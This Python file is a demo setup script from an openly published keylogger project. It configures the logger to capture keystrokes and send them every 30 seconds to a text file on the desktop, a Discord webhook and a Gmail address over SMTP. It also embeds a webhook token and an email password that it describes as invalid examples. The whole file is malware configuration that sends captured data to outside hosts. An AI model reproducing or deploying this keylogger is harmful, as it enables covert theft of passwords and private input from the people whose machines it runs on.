#!/usr/bin/env python3
# https://github.com/EONRaider/bca-keylogger

__author__ = "EONRaider @ keybase.io/eonraider"

import pathlib

from src.keylogger import KeyLogger
from src.exfiltrators import Discord, Email, Screen, TextFile


'''This is a simple demonstration of how the keylogger could be set up 
on a Linux system to exfiltrate information to a text file, a Discord 
server and an email address (as well as to the screen for debugging 
purposes). All credentials are invalid and serve as mere examples.'''

# Setting up the Keylogger to exfiltrate data every 30 seconds
keylogger = KeyLogger(exfil_time=30)

# Enabling output of logs to STDOUT
Screen(keylogger=keylogger)

# A file will be written to the current user's Desktop
TextFile(keylogger=keylogger,
         file_path=pathlib.Path.home().joinpath("Desktop/sample_log.txt"))

# Captured data will be sent to a Discord server through a Webhook URL
Discord(keylogger=keylogger,
        webhook_url="https://discord.com/api/webhooks/896081552151306340/"
                    "ikFf8J24Yk1VWjMBMP_tjrcNHFuaIZWp0la8zoeZn1QAaQa93x7e"
                    "S24cFreKbfKyo49e")

# An email will be sent through a secure connection using SMTP
Email(keylogger=keylogger,
      smtp_host="smtp.gmail.com",
      smtp_port=465,
      email="eonraider.keylogger@gmail.com",
      password="yMQsKYDFhod!E84fSSaE74bLoKSgAkapz$Ro8J9C")

keylogger.execute()  # Done. Exfiltration of data will begin.
